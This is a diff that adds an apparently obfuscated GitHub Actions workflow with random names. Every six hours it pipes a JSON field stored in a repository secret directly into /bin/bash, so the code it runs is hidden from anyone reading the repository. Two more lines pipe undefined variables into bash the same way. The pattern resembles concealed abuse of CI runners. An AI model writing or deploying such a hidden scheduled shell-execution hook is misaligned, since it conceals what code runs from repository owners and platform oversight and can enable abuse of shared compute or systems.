@@ -1,0 +1,20 @@
+name: yanlondonon
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanlondonon
+        env:
+          qixd11: ${{ secrets.qixd11 }}
+        run: |
+          echo $qixd11 | jq -r .mxezd48938 | /bin/bash
+          echo $yuej8852 | jq -r .gahzu76 | /bin/bash
+          echo $ysw0 | jq -r .c4 | /bin/bash
+
